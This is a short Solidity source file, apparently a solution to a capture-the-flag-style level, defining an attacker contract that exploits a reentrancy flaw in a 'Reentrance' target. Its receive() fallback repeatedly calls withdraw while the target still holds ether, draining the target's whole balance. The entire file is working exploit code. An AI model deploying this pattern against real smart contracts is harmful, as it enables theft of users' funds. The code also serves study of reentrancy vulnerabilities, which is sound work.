// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        console.log("hacking");
        Reentrance(contractAddress).donate{ value: address(this).balance }(address(this));
        console.log("donated");
        Reentrance(contractAddress).withdraw();
    }

    receive() external payable {
        console.log("receiving");
        if (address(contractAddress).balance > 0) {
            Reentrance(contractAddress).withdraw();
        }
    }
}
